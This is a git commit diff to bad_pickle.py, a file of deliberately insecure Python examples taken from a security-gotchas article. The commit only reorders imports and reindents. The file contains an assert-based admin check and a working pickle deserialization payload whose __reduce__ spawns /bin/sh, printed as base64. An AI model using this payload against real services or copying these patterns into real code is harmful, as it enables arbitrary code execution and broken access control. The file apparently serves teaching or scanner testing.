4a3ab1dbb43c3d29cd5d206debc88fa0fc48f334
Lukas Hrmo <493067@fi.muni.cz>
2020-12-03 10:50:21 +0100

    try3

--- bad_pickle.py
+++ bad_pickle.py
@@ -1,10 +1,10 @@
 # contains bunch of buggy examples
 # taken from
 # https://hackernoon.com/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03
-import cPickle
-import subprocess
 import base64
 import subprocess
+import cPickle
+
 
 
 # Input injection
@@ -15,14 +15,14 @@ def transcode_file(request, filename):
 
 # Assert statements
 def foo(request, user):
-   assert user.is_admin, 'user does not have access'
-   # secure code...
+    assert user.is_admin, 'user does not have access'
+    # secure code...
 
 
 # Pickles
 class RunBinSh(object):
-  def __reduce__(self):
-    return (subprocess.Popen, (('/bin/sh',),))
+    def __reduce__(self):
+        return (subprocess.Popen, (('/bin/sh',),))
 
 
 print(base64.b64encode(cPickle.dumps(RunBinSh())))
